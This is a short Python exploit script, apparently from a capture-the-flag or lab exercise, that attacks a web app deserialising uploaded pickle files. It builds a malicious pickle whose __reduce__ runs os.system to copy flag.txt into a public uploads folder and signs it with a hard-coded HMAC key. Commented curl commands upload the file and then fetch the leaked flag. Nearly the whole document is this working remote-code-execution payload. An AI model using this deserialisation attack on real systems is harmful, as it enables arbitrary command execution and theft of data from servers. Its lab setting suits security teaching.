# attack scenario (test)
# this is the script file which the attacker uses in his local PC
import pickle, os, hashlib, hmac

class RCE:
    def __reduce__(self):
        return (os.system, ("cat flag.txt > app/uploads/hacked.txt",))

SECRET_KEY = "pickle_tickle"
payload = pickle.dumps(RCE())
sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print(f"HMAC signature: {sig}")

# hacker then uploads the malicious.pkl file on the website
'''
curl -X POST http://localhost:916/upload \
  -F "file=@malicious.pkl" \
  -F "sig=02c4d0035b398f461d77de9fd987abe50fee4d48292409063b53daba32d3be71"  # requires correct sig here
'''
'''
1. generate hacked.txt below /uploads/
2. check the flag by $ curl http://localhost:916/uploads/hacked.txt

'''